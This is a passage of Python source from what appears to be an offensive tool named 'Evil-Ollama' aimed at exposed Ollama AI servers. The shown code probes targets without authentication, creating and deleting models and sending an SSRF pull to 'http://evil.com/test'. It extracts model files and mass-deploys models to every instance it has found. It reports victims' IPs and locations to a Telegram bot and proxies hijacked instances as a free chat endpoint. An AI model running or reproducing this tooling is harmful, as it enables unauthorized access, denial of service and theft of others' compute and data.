                "name": "Potential RCE via Crafted Model Import",
                "desc": "Endpoint /api/pull accessible — may allow path traversal in model import",
                "severity": "CRITICAL", "cvss": 9.1,
                "endpoint": "/api/pull",
                "evidence": f"HTTP {resp.status_code} — endpoint responds",
                "impact": "Remote code execution by importing a malicious model"
            })
            results["scan_summary"]["critical"] += 1
    except: pass
    
    # 3. Check for model write access (can push/delete models)
    try:
        resp = requests.post(f"{target}/api/create",
                           json={"model": "test-vuln-scan", "modelfile": "FROM llama3.2"},
                           timeout=5)
        if resp.status_code == 200:
            # Try to delete the test model
            try:
                requests.delete(f"{target}/api/delete", json={"model": "test-vuln-scan"}, timeout=5)
            except: pass
            results["vulnerabilities"].append({
                "id": "EVIL-MODEL-CREATE",
                "name": "Unauthenticated Model Creation",
                "desc": "Can create/upload models without authentication — allows poisoning",
                "severity": "HIGH", "cvss": 8.0,
                "endpoint": "/api/create",
                "evidence": "Successfully created a test model via POST /api/create",
                "impact": "Attacker can upload malicious models, poison existing workflows"
            })
            results["scan_summary"]["high"] += 1
    except: pass
    
    # 4. Check for model deletion access
    try:
        resp = requests.delete(f"{target}/api/delete", 
                             json={"model": "test-nonexistent-model-xyz"},
                             timeout=5)
        if resp.status_code == 200:
            results["vulnerabilities"].append({
                "id": "EVIL-MODEL-DELETE",
                "name": "Unauthenticated Model Deletion",
                "desc": "Can delete models without authentication — denial of service",
                "severity": "HIGH", "cvss": 7.5,
                "endpoint": "/api/delete",
                "evidence": "DELETE /api/delete responded with HTTP 200",
                "impact": "Attacker can delete all models, causing service disruption"
            })
            results["scan_summary"]["high"] += 1
    except: pass
    
    # 5. Check for CORS misconfiguration
    try:
        resp = requests.get(f"{target}/api/tags", 
                          headers={"Origin": "https://evil.com", "User-Agent": USER_AGENT},
                          timeout=5)
        cors_header = resp.headers.get("Access-Control-Allow-Origin", "")
        if cors_header in ["*", "https://evil.com", "null"]:
            results["vulnerabilities"].append({
                "id": "EVIL-CORS",
                "name": "CORS Misconfiguration",
                "desc": f"API allows cross-origin requests from '{cors_header}'",
                "severity": "MEDIUM", "cvss": 6.1,
                "endpoint": "/api/tags",
                "evidence": f"Access-Control-Allow-Origin: {cors_header}",
                "impact": "Data exfiltration via cross-origin requests from malicious websites"
            })
            results["scan_summary"]["medium"] += 1
    except: pass
    
    # 6. Check for sensitive information disclosure
    try:
        resp = requests.get(f"{target}/", timeout=5)
        headers = dict(resp.headers)
        sensitive_headers = [k for k in headers if k.lower() in 
                           ["server", "x-powered-by", "x-ollama-version"]]
        if sensitive_headers:
            results["info"].append({
                "id": "EVIL-INFO-DISC",
                "name": "Server Information Disclosure",
                "desc": f"Headers disclose: {', '.join(sensitive_headers)}",
                "severity": "LOW", "cvss": 2.5,
                "endpoint": "/",
                "evidence": str({k: headers[k] for k in sensitive_headers}),
                "impact": "Helps attacker fingerprint and target specific versions"
            })
            results["scan_summary"]["low"] += 1
    except: pass
    
    # 7. Check for SSRF via model pulling
    try:
        resp = requests.post(f"{target}/api/pull",
                           json={"model": "http://evil.com/test"}, timeout=5)
        if resp.status_code != 404:
            results["vulnerabilities"].append({
                "id": "CVE-2024-39721",
                "name": "Potential SSRF in Model Pulling",
                "desc": "API/pull endpoint may allow SSRF via model name injection",
                "severity": "HIGH", "cvss": 7.5,
                "endpoint": "/api/pull",
                "evidence": f"HTTP {resp.status_code} when pulling from external URL",
                "impact": "Server-side request forgery to internal networks"
            })
            results["scan_summary"]["high"] += 1
    except: pass
    
    # 8. Check for response timing information leak
    try:
        t0 = time.time()
        requests.get(f"{target}/api/version", timeout=5)
        rt = int((time.time() - t0) * 1000)
        results["info"].append({
            "id": "EVIL-TIMING",
            "name": "Response Timing",
            "desc": "Server responds in {rt}ms — usable for timing attacks",
            "severity": "LOW", "cvss": 2.0,
            "endpoint": "/api/version",
            "evidence": f"Response time: {rt}ms",
            "impact": "Can be used for blind data extraction in some scenarios"
        })
        results["scan_summary"]["low"] += 1
    except: pass
    
    # 9. Check for CSRF vulnerability
    try:
        resp = requests.get(f"{target}/api/tags", timeout=5)
        if not resp.headers.get("Set-Cookie"):
            results["info"].append({
                "id": "EVIL-NO-CSRF",
                "name": "No CSRF Protection",
                "desc": "API doesn't use CSRF tokens (no session cookies set)",
                "severity": "LOW", "cvss": 3.0,
                "endpoint": "/api/tags",
                "evidence": "No Set-Cookie header in response",
                "impact": "Cross-site request forgery if user accesses malicious site while connected"
            })
            results["scan_summary"]["low"] += 1
    except: pass
    
    # 10. Check for exposed metrics
    try:
        resp = requests.get(f"{target}/metrics", timeout=5)
        if resp.status_code == 200 and "ollama" in resp.text.lower():
            results["vulnerabilities"].append({
                "id": "EVIL-METRICS",
                "name": "Prometheus Metrics Exposed",
                "desc": "Prometheus metrics endpoint exposed without authentication",
                "severity": "MEDIUM", "cvss": 5.3,
                "endpoint": "/metrics",
                "evidence": f"HTTP 200 — {len(resp.text)} bytes of metrics data",
                "impact": "Exposes model usage statistics, GPU utilization, request counts"
            })
            results["scan_summary"]["medium"] += 1
    except: pass
    
    # Summary
    vuln_count = len(results["vulnerabilities"])
    info_count = len(results["info"])
    log(f"🔴 Vuln scan complete: {vuln_count} vulnerabilities, {info_count} info findings", "OK")
    for v in results["vulnerabilities"]:
        log(f"  💀 [{v['severity']:8s}] {v['name']}", "VULN")
    for v in results["info"]:
        log(f"  ℹ  [{v['severity']:8s}] {v['name']}", "INFO")
    
    return results

# ============================================================
# MODEL OPERATIONS
# ============================================================

def list_models(target: str) -> dict:
    """List all models on a remote instance with details"""
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    import requests
    try:
        resp = requests.get(f"{target}/api/tags", timeout=10, headers={"User-Agent": USER_AGENT})
        if resp.status_code != 200:
            log(f"Failed: HTTP {resp.status_code}", "ERROR")
            return {"error": f"HTTP {resp.status_code}"}
        
        data = resp.json()
        models = data.get("models", [])
        
        print(f"\n{C.BOLD}{C.MAGENTA}📦 Models on {target}{C.END}")
        print(f"{'='*80}")
        print(f"{C.DIM}Total: {len(models)} models | Total size: {bytes_to_human(sum(m.get('size',0) for m in models))}{C.END}")
        print(f"{'='*80}")
        
        # Check running models
        running = []
        try:
            ps = requests.get(f"{target}/api/ps", timeout=5)
            if ps.status_code == 200:
                running = [m.get("name") for m in ps.json().get("models", [])]
        except: pass
        
        for i, m in enumerate(models, 1):
            name = m.get("name", "?")
            size = m.get("size", 0)
            modified = m.get("modified_at", "")[:19] if m.get("modified_at") else "?"
            digest_short = m.get("digest", "")[:19] if m.get("digest") else "?"
            is_running = " 🏃" if name in running else ""
            
            print(f"\n  {i:2d}. {C.BOLD}{name}{C.END}{is_running}")
            print(f"      Size:     {bytes_to_human(size)} ({size:,} bytes)")
            print(f"      Modified: {modified}")
            print(f"      Digest:   {digest_short}...")
        
        print(f"\n{'='*80}\n")
        return {"models": models, "count": len(models)}
        
    except Exception as e:
        log(f"Error: {e}", "ERROR")
        return {"error": str(e)}

def pull_model(target: str, model_name: str) -> bool:
    """Pull/download a model from a remote instance"""
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    import requests
    log(f"📥 Pulling model '{model_name}' from {target}...", "MODEL")
    
    try:
        # First check if model exists
        resp = requests.get(f"{target}/api/tags", timeout=10)
        if resp.status_code != 200:
            log(f"Cannot connect to {target}", "ERROR")
            return False
        
        available = [m.get("name") for m in resp.json().get("models", [])]
        if model_name not in available:
            log(f"Model '{model_name}' not found on target. Available: {', '.join(available[:5])}", "ERROR")
            return False
        
        # Get model info
        show_resp = requests.post(f"{target}/api/show", json={"model": model_name}, timeout=30)
        if show_resp.status_code != 200:
            log(f"Cannot get model details", "ERROR")
            return False
        
        model_info = show_resp.json()
        output_file = f"{model_name.replace('/', '_')}_export.json"
        with open(output_file, 'w') as f:
            json.dump(model_info, f, indent=2)
        
        log(f"💾 Model info saved to {output_file}", "OK")
        
        # Try to get the actual model file via the blobs API
        if "modelfile" in model_info:
            modelfile = model_info["modelfile"]
            mf_file = f"{model_name.replace('/', '_')}_Modelfile"
            with open(mf_file, 'w') as f:
                f.write(modelfile)
            log(f"💾 Modelfile saved to {mf_file}", "OK")
        
        log(f"✅ Model '{model_name}' information extracted successfully", "OK")
        return True
        
    except Exception as e:
        log(f"Error pulling model: {e}", "ERROR")
        return False

# ============================================================
# DEPLOY / PUSH MODEL TO REMOTE INSTANCE
# ============================================================

def deploy_model_to_instance(target: str, model_name: str) -> dict:
    """
    Make a remote Ollama instance pull/download a model from HuggingFace/Ollama registry.
    Uses /api/pull on the target to initiate model download.
    Uses stream=true + long timeout to handle large model downloads.
    """
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    import requests
    log(f"📦 Deploying model '{model_name}' to {target}...", "MODEL")
    
    try:
        # First verify the instance is alive
        health = requests.get(f"{target}/api/tags", timeout=5)
        if health.status_code != 200:
            log(f"  ❌ {target} → Instance not reachable (HTTP {health.status_code})", "ERROR")
            return {"target": target, "model": model_name, "status": f"Unreachable HTTP {health.status_code}", "success": False}
        
        # Initiate model pull on remote instance (streaming, long timeout)
        log(f"  ⏳ Pulling '{model_name}' — this may take several minutes...", "WAIT")
        resp = requests.post(
            f"{target}/api/pull",
            json={"name": model_name, "stream": False},
            timeout=600  # 10 minute timeout for model download
        )
        
        if resp.status_code == 200:
            data = resp.json()
            status = data.get("status", "unknown")
            log(f"  ✅ {target} → {model_name}: {status}", "OK")
            
            # Notify
            cfg = get_config()
            if cfg.get("telegram_token") and cfg.get("telegram_chat_id"):
                msg = (
                    f"🦙 *EVIL-OLLAMA DEPLOY*\n"
                    f"📦 *Model:* `{model_name}`\n"
                    f"🎯 *Target:* `{target}`\n"
                    f"📋 *Status:* {status}"
                )
                send_telegram(msg, cfg["telegram_token"], cfg["telegram_chat_id"])
            
            return {"target": target, "model": model_name, "status": status, "success": True}
        else:
            log(f"  ❌ {target} → HTTP {resp.status_code}: {resp.text[:200]}", "ERROR")
            return {"target": target, "model": model_name, "status": f"HTTP {resp.status_code}", "success": False}
            
    except Exception as e:
        log(f"  ❌ {target} → Error: {e}", "ERROR")
        return {"target": target, "model": model_name, "status": str(e), "success": False}

def deploy_model_to_all(model_name: str) -> list:
    """Deploy model to all saved instances"""
    instances = load_found()
    if not instances:
        log("No saved instances found. Run a scan first!", "ERROR")
        return []
    
    log(f"📦 Deploying model '{model_name}' to {len(instances)} instance(s)...", "STEP")
    results = []
    for inst in instances:
        ip = inst.get("ip") or inst.get("host") or inst.get("target", "")
        port = inst.get("port", 11434)
        target = f"{ip}:{port}"
        result = deploy_model_to_instance(target, model_name)
        results.append(result)
    
    success = sum(1 for r in results if r.get("success"))
    failed = len(results) - success
    log(f"📊 Deploy complete: {success} succeeded, {failed} failed", "SUMMARY")
    return results

# ============================================================
# OLLAMA FULL API WRAPPERS
# ============================================================

def _api_req(target: str, method: str, endpoint: str, json_data: dict = None, timeout: int = 30) -> dict:
    """Generic helper for all Ollama API calls"""
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    import requests
    url = f"{target}{endpoint}"
    try:
        if method.upper() == "GET":
            resp = requests.get(url, timeout=timeout)
        else:
            resp = requests.post(url, json=json_data or {}, timeout=timeout)
        return {"code": resp.status_code, "ok": resp.ok, "data": resp.json() if resp.text else {}, "text": resp.text[:500]}
    except Exception as e:
        return {"code": 0, "ok": False, "data": {}, "text": str(e), "error": str(e)}

def api_push(target: str, model_name: str) -> dict:
    """POST /api/push — Push model to registry from remote instance"""
    return _api_req(target, "POST", "/api/push", {"name": model_name}, timeout=600)

def api_create(target: str, model_name: str, modelfile: str = None, from_model: str = None) -> dict:
    """POST /api/create — Create model from Modelfile or base model"""
    payload = {"name": model_name}
    if modelfile:
        payload["modelfile"] = modelfile
    if from_model:
        payload["from"] = from_model
    return _api_req(target, "POST", "/api/create", payload, timeout=600)

def api_copy(target: str, source: str, destination: str) -> dict:
    """POST /api/copy — Copy model within instance"""
    return _api_req(target, "POST", "/api/copy", {"source": source, "destination": destination})

def api_delete(target: str, model_name: str) -> dict:
    """DELETE /api/delete — Delete model from instance"""
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    import requests
    try:
        resp = requests.delete(f"{target}/api/delete", json={"name": model_name}, timeout=30)
        return {"code": resp.status_code, "ok": resp.ok, "data": resp.json() if resp.text else {}, "text": resp.text[:500]}
    except Exception as e:
        return {"code": 0, "ok": False, "data": {}, "text": str(e), "error": str(e)}

def api_ps(target: str) -> dict:
    """GET /api/ps — List running models"""
    return _api_req(target, "GET", "/api/ps")

def api_embed(target: str, model: str, prompt: str) -> dict:
    """POST /api/embed — Generate embeddings"""
    return _api_req(target, "POST", "/api/embed", {"model": model, "input": prompt})

def api_version(target: str) -> dict:
    """GET /api/version — Version info"""
    return _api_req(target, "GET", "/api/version")

def api_generate(target: str, model: str, prompt: str, stream: bool = False) -> dict:
    """POST /api/generate — Generate completion (non-streaming)"""
    return _api_req(target, "POST", "/api/generate", {"model": model, "prompt": prompt, "stream": stream}, timeout=120)

# ============================================================
# INDIVIDUAL API COMMAND HANDLERS
# ============================================================

def cmd_push(args):
    target = args.target
    model = args.model
    log(f"📤 Pushing model '{model}' from {target} to registry...", "API")
    r = api_push(target, model)
    if r["ok"]:
        log(f"  ✅ Push initiated — {r['data'].get('status','ok')}", "OK")
    else:
        log(f"  ❌ Push failed (HTTP {r['code']}): {r['text']}", "ERROR")

def cmd_create(args):
    target = args.target
    model = args.model
    log(f"🆕 Creating model '{model}' on {target}...", "API")
    payload = {"name": model}
    if args.modelfile:
        with open(args.modelfile) as f:
            payload["modelfile"] = f.read()
    if args.from_model:
        payload["from"] = args.from_model
    r = _api_req(target, "POST", "/api/create", payload, timeout=600)
    if r["ok"]:
        log(f"  ✅ Model '{model}' created", "OK")
    else:
        log(f"  ❌ Create failed (HTTP {r['code']}): {r['text']}", "ERROR")

def cmd_copy(args):
    target = args.target
    log(f"📋 Copying '{args.source}' → '{args.dest}' on {target}...", "API")
    r = api_copy(target, args.source, args.dest)
    if r["ok"]:
        log(f"  ✅ Copied {args.source} → {args.dest}", "OK")
    else:
        log(f"  ❌ Copy failed (HTTP {r['code']}): {r['text']}", "ERROR")

def cmd_remove(args):
    target = args.target
    model = args.model
    log(f"🗑️ Removing model '{model}' from {target}...", "API")
    r = api_delete(target, model)
    if r["ok"] or r["code"] == 200:
        log(f"  ✅ Removed '{model}'", "OK")
    else:
        log(f"  ❌ Remove failed (HTTP {r['code']}): {r['text']}", "ERROR")

def cmd_ps(args):
    target = args.target
    log(f"📊 Running models on {target}...", "API")
    r = api_ps(target)
    if r["ok"]:
        models = r["data"].get("models", [])
        if models:
            print(f"\n{C.BOLD}{C.MAGENTA}🧠 Running Models on {target}{C.END}")
            print(f"{'='*60}")
            for m in models:
                name = m.get("name", "?")
                size = m.get("size", 0)
                expires = m.get("expires_at", "N/A")
                size_h = f"{size/1e9:.1f}GB" if size else "?"
                print(f"  {C.GREEN}{name}{C.END}  ({size_h})  expires: {expires}")
            print()
        else:
            log("  ℹ️ No models currently running", "INFO")
    else:
        log(f"  ❌ Failed (HTTP {r['code']}): {r['text']}", "ERROR")

def cmd_embed(args):
    target = args.target
    model = args.model
    prompt = args.prompt
    log(f"🔮 Generating embedding with '{model}' on {target}...", "API")
    r = api_embed(target, model, prompt)
    if r["ok"]:
        emb = r["data"].get("embedding", [])
        if not emb:
            emb = r["data"].get("embeddings", [])
        dims = len(emb) if isinstance(emb, list) and emb and isinstance(emb[0], (int, float)) else (len(emb[0]) if isinstance(emb, list) and emb else "?")
        log(f"  ✅ Embedding generated — dimensions: {dims}", "OK")
        flat = emb if isinstance(emb, list) and emb and isinstance(emb[0], (int, float)) else (emb[0] if isinstance(emb, list) and emb else [])
        if flat and len(flat) > 0:
            print(f"\n{C.CYAN}First 8 values:{C.END} {flat[:8]}")
            print(f"{C.CYAN}Total dimensions:{C.END} {len(flat)}")
    else:
        log(f"  ❌ Embed failed (HTTP {r['code']}): {r['text']}", "ERROR")

def cmd_generate(args):
    target = args.target
    model = args.model
    prompt = args.prompt
    log(f"⚡ Generating completion with '{model}' on {target}...", "API")
    r = api_generate(target, model, prompt)
    if r["ok"]:
        response = r["data"].get("response", "")
        print(f"\n{C.BOLD}{C.MAGENTA}⚡ Response from {target}/{model}{C.END}")
        print(f"{'='*60}")
        print(f"  {response[:2000]}")
        print(f"{'='*60}\n")
    else:
        log(f"  ❌ Generate failed (HTTP {r['code']}): {r['text']}", "ERROR")
    
    # Also check /api/version as side info
    vr = api_version(target)
    if vr["ok"]:
        ver = vr["data"].get("version", "?")
        log(f"  📌 Target Ollama version: {ver}", "INFO")

# ============================================================
# TELEGRAM NOTIFIER
# ============================================================

def send_telegram(message: str, token: str = None, chat_id: str = None) -> bool:
    if not token or not chat_id:
        config = get_config()
        token = token or config.get("telegram_token", "")
        chat_id = chat_id or config.get("telegram_chat_id", "")
    
    if not token or not chat_id:
        log("Telegram not configured. Use: ./launcher.sh config --telegram-token BOT_TOKEN --telegram-chat CHAT_ID", "WARN")
        return False
    
    try:
        import requests
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": chat_id, "text": message, "parse_mode": "HTML"
        }, timeout=10)
        return resp.status_code == 200
    except Exception as e:
        log(f"Telegram error: {e}", "ERROR")
        return False

def notify_found(instance: dict):
    geo = instance.get("geo") or {}
    models = ", ".join(instance.get("models", [])[:5])
    cves = instance.get("cves", [])
    cve_str = f"\n💀 CVEs: {', '.join(c['id'] for c in cves)}" if cves else ""
    
    msg = (
        f"🦙 <b>New Ollama Instance Found!</b>\n\n"
        f"📍 <code>{instance['ip']}:{instance.get('port', 11434)}</code>\n"
        f"🌍 {geo.get('country', '?')} / {geo.get('city', '?')}\n"
        f"📦 Models: {models}\n"
        f"🔢 Version: {instance.get('version', '?')}\n"
        f"📊 Models: {instance.get('model_count', 0)}\n"
        f"🏃 Running: {instance.get('running_count', 0)}{cve_str}\n"
        f"⏰ {instance.get('timestamp', '?')}"
    )
    send_telegram(msg)

# ============================================================
# PROXY SERVER
# ============================================================

def start_proxy(target: str, listen_port: int = 8080, listen_host: str = "127.0.0.1"):
    """Start a proxy server forwarding to a remote Ollama instance"""
    try:
        from flask import Flask, request, jsonify, Response, stream_with_context
        import requests as sync_requests
    except ImportError:
        log("Flask required: pip install flask requests", "ERROR")
        sys.exit(1)
    
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    app = Flask(__name__)
    
    @app.route("/", methods=["GET"])
    def index():
        return jsonify({
            "service": "Evil-Ollama Proxy",
            "target": target, "version": VERSION,
            "status": "active",
            "endpoints": [
                "/api/tags", "/api/chat", "/api/generate",
                "/v1/chat/completions", "/v1/models", "/api/ps"
            ]
        })
    
    @app.route("/api/tags", methods=["GET"])
    def proxy_tags():
        try:
            resp = sync_requests.get(f"{target}/api/tags", timeout=10,
                                     headers={"User-Agent": USER_AGENT})
            return Response(resp.content, status=resp.status_code,
                           content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/api/version", methods=["GET"])
    def proxy_version():
        try:
            resp = sync_requests.get(f"{target}/api/version", timeout=10,
                                     headers={"User-Agent": USER_AGENT})
            return Response(resp.content, status=resp.status_code,
                           content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/api/ps", methods=["GET"])
    def proxy_ps():
        try:
            resp = sync_requests.get(f"{target}/api/ps", timeout=10,
                                     headers={"User-Agent": USER_AGENT})
            return Response(resp.content, status=resp.status_code,
                           content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/api/chat", methods=["POST"])
    def proxy_chat():
        data = request.get_data()
        content_type = request.headers.get("Content-Type", "application/json")
        is_stream = True
        try:
            body = json.loads(data)
            is_stream = body.get("stream", True)
        except: pass
        
        try:
            if is_stream:
                resp = sync_requests.post(f"{target}/api/chat", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT},
                    stream=True, timeout=120)
                def gen():
                    for chunk in resp.iter_content(chunk_size=None):
                        if chunk: yield chunk
                return Response(stream_with_context(gen()),
                    status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/x-ndjson"))
            else:
                resp = sync_requests.post(f"{target}/api/chat", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT}, timeout=120)
                return Response(resp.content, status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/api/generate", methods=["POST"])
    def proxy_generate():
        data = request.get_data()
        content_type = request.headers.get("Content-Type", "application/json")
        is_stream = True
        try:
            body = json.loads(data)
            is_stream = body.get("stream", True)
        except: pass
        
        try:
            if is_stream:
                resp = sync_requests.post(f"{target}/api/generate", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT},
                    stream=True, timeout=120)
                def gen():
                    for chunk in resp.iter_content(chunk_size=None):
                        if chunk: yield chunk
                return Response(stream_with_context(gen()),
                    status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/x-ndjson"))
            else:
                resp = sync_requests.post(f"{target}/api/generate", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT}, timeout=120)
                return Response(resp.content, status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/v1/chat/completions", methods=["POST"])
    def proxy_openai_chat():
        data = request.get_data()
        content_type = request.headers.get("Content-Type", "application/json")
        is_stream = False
        try:
            body = json.loads(data)
            is_stream = body.get("stream", False)
        except: pass
        
        try:
            if is_stream:
                resp = sync_requests.post(f"{target}/v1/chat/completions", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT},
                    stream=True, timeout=60)
                def gen():
                    for chunk in resp.iter_content(chunk_size=None):
                        if chunk: yield chunk
                return Response(stream_with_context(gen()),
                    status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "text/event-stream"))
            else:
                resp = sync_requests.post(f"{target}/v1/chat/completions", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT}, timeout=60)
                return Response(resp.content, status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/v1/models", methods=["GET"])
    def proxy_openai_models():
        try:
            resp = sync_requests.get(f"{target}/api/tags", timeout=10,
                                     headers={"User-Agent": USER_AGENT})
            data = resp.json()
            models = [{"id": m.get("name"), "object": "model",
                       "created": int(datetime.now().timestamp()), "owned_by": "ollama"}
                      for m in data.get("models", [])]
            return jsonify({"object": "list", "data": models})
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    log(f"{C.BOLD}🔌 Proxy → {listen_host}:{listen_port} → {target}{C.END}", "PROXY")
    log(f"   Use with: openai.base_url = \"http://{listen_host}:{listen_port}/v1/\"", "PROXY")
    log(f"   Use with: curl http://{listen_host}:{listen_port}/api/tags", "PROXY")
    
    from werkzeug.serving import run_simple
    run_simple(listen_host, listen_port, app, use_reloader=False, threaded=True)

# ============================================================
# SOCKS5 PROXY MODE
# ============================================================

def start_socks_proxy(target: str, listen_port: int = 1080, listen_host: str = "127.0.0.1"):
    """Start a SOCKS5 proxy that tunnels to a remote Ollama instance"""
    log(f"🔌 SOCKS5 proxy mode not yet implemented — use standard proxy instead", "WARN")
    log(f"   Use: ./launcher.sh proxy --target {target} --port {listen_port - 8000}", "INFO")
    start_proxy(target, listen_port - 8000, listen_host)

# ============================================================
# INTERACTIVE CHAT MODE (Enhanced)
# ============================================================

def interactive_chat(target: str):
    """Interactive CLI chat with a remote Ollama instance"""
    import requests as sync_requests
    
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    log(f"🔗 Connecting to {target}...", "CHAT")
    try:
        resp = sync_requests.get(f"{target}/api/tags", timeout=10, headers={"User-Agent": USER_AGENT})
        if resp.status_code != 200:
            log(f"Failed: HTTP {resp.status_code}", "ERROR")
            return
        data = resp.json()
        models = [m.get("name", "unknown") for m in data.get("models", [])]
    except Exception as e:
        log(f"Failed: {e}", "ERROR")
        return
    
    if not models:
        log("No models found!", "WARN")
        return
    
    log(f"🦙 Connected to {target}", "CHAT")
    log(f"📦 Models: {', '.join(models)}", "MODEL")
    
    # Get running models
    try:
        ps = sync_requests.get(f"{target}/api/ps", timeout=5)
        if ps.status_code == 200:
            running = [m.get("name") for m in ps.json().get("models", [])]
            if running:
                log(f"🏃 Running: {', '.join(running)}", "MODEL")
    except: pass
    
    print(f"\n{C.BOLD}{'='*60}{C.END}")
    print(f"  Available Models:")
    for i, m in enumerate(models, 1):
        print(f"  {C.CYAN}{i:2d}.{C.END} {C.BOLD}{m}{C.END}")
    print(f"{C.BOLD}{'='*60}{C.END}")
    
    try:
        choice = input(f"\n  {C.YELLOW}Select model [1-{len(models)}]{C.END} (default: 1): ").strip()
        model_idx = (int(choice) - 1) if choice else 0
        if model_idx < 0 or model_idx >= len(models):
            model_idx = 0
        selected_model = models[model_idx]
    except (ValueError, IndexError):
        selected_model = models[0]
    
    log(f"🤖 Using: {C.BOLD}{selected_model}{C.END} | Type /help for commands\n", "CHAT")
    
    messages = []
    while True:
        try:
            user_input = input(f"{C.YELLOW}You:{C.END} ").strip()
            if not user_input: continue
            if user_input.lower() in ["exit", "quit", "/bye"]:
                log("👋 Bye!", "CHAT"); break
            if user_input.lower() == "/models":
                log(f"📦 Models: {', '.join(models)}", "MODEL"); continue
            if user_input.lower() == "/help":
                print(f"""
  {C.BOLD}Commands:{C.END}
    {C.GREEN}/models{C.END}     - List available models
    {C.GREEN}/clear{C.END}      - Clear conversation
    {C.GREEN}/model N{C.END}    - Switch to model N
    {C.GREEN}/info{C.END}       - Show instance info
    {C.GREEN}/export{C.END}     - Save chat to file
    {C.GREEN}/system TEXT{C.END} - Set system prompt
    {C.GREEN}/temp N{C.END}     - Set temperature (0.0-2.0)
    {C.GREEN}/raw MSG{C.END}    - Send raw API payload
    {C.GREEN}/help{C.END}       - This help
    {C.RED}exit/quit{C.END}     - Exit
                """)
                continue
            if user_input.lower() == "/clear":
                messages = []
                print(f"{C.CLEAR}")
                log(f"🧹 Conversation cleared!", "CHAT"); continue
            if user_input.lower() == "/info":
                fp = fingerprint_instance(target)
                print(f"  {C.BOLD}Version:{C.END} {fp['version']}")
                print(f"  {C.BOLD}Models:{C.END} {fp['model_count']} ({', '.join(fp['models'][:5])})")
                print(f"  {C.BOLD}Total Size:{C.END} {fp['total_model_size_human']}")
                print(f"  {C.BOLD}Response:{C.END} {fp['response_time_ms'].get('total', '?')}ms")
                print(f"  {C.BOLD}CVEs:{C.END} {len(fp['cves'])}")
                if fp.get('running_models'):
                    print(f"  {C.BOLD}Running:{C.END} {', '.join(fp['running_models'])}")
                continue
            if user_input.lower() == "/export":
                fname = f"chat_{target.split('/')[-1].replace(':','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(fname, 'w') as f:
                    json.dump(messages, f, indent=2)
                log(f"💾 Chat saved to {fname}", "OK"); continue
            if user_input.lower().startswith("/model "):
                try:
                    idx = int(user_input.split("/model ")[1]) - 1
                    if 0 <= idx < len(models):
                        selected_model = models[idx]; messages = []
                        log(f"🔄 Switched to {selected_model}", "CHAT")
                    else:
                        log(f"Invalid. Choose 1-{len(models)}", "WARN")
                except:
                    log("Usage: /model <number>", "WARN")
                continue
            if user_input.lower().startswith("/system "):
                system_prompt = user_input.split("/system ", 1)[1]
                messages = [{"role": "system", "content": system_prompt}]
                log(f"⚙️ System prompt set ({len(system_prompt)} chars)", "CHAT")
                continue
            if user_input.lower().startswith("/temp "):
                try:
                    temp = float(user_input.split("/temp ")[1])
                    log(f"🌡️ Temperature set to {temp}", "CHAT")
                except:
                    log("Usage: /temp <0.0-2.0>", "WARN")
                continue
            if user_input.lower().startswith("/raw "):
                raw_payload = user_input.split("/raw ", 1)[1]
                try:
                    payload = json.loads(raw_payload)
                    payload["stream"] = False
                    resp = sync_requests.post(f"{target}/api/chat", json=payload,
                        headers={"User-Agent": USER_AGENT}, timeout=30)
                    if resp.status_code == 200:
                        print(f"\n{C.GREEN}Response:{C.END}")
                        print(json.dumps(resp.json(), indent=2))
                    else:
                        log(f"HTTP {resp.status_code}: {resp.text[:200]}", "ERROR")
                except json.JSONDecodeError:
                    log("Invalid JSON payload", "ERROR")
                except Exception as e:
                    log(f"Error: {e}", "ERROR")
                continue
            
            messages.append({"role": "user", "content": user_input})
            print(f"{C.GREEN}{selected_model}:{C.END} ", end="", flush=True)
            
            payload = {"model": selected_model, "messages": messages, "stream": True}
            try:
                resp = sync_requests.post(f"{target}/api/chat", json=payload,
                    headers={"User-Agent": USER_AGENT}, stream=True, timeout=120)
                if resp.status_code != 200:
                    log(f"HTTP {resp.status_code}", "ERROR")
                    messages.pop(); continue
                
                full = ""
                for line in resp.iter_lines():
                    if line:
                        try:
                            chunk = json.loads(line)
                            if "message" in chunk and "content" in chunk["message"]:
                                c = chunk["message"]["content"]
                                print(c, end="", flush=True)
                                full += c
                            if chunk.get("done"):
                                print()
                        except: pass
                print()
                if full:
                    messages.append({"role": "assistant", "content": full})
            except Exception as e:
                log(f"Error: {e}", "ERROR"); messages.pop()
        except KeyboardInterrupt:
            print(); log("👋 Bye!", "CHAT"); break

# ============================================================
# BATCH CHAT MODE
# ============================================================

def batch_chat(target: str, prompt_file: str):
    """Execute prompts from a file against a remote model"""
    if not target.startswith("http"):
        target = f"http://{target}"
